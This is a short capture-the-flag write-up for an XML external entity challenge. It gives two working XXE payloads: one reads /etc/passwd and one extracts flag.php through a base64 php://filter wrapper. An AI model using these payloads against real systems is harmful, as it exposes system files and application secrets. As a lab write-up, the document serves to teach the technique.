# Writeup

In order to solve the challenge a POST request has to be made to the page.

A test would be to send the following content:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM '/etc/passwd'>]>
<root>
&test;
</root>
```

In order to exfiltrate `flag.php` the content needs to be BASE64-ed using a php filter because the `flag.php` is invalid XML.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=flag.php'>
]>
<root>
&test;
</root>
```
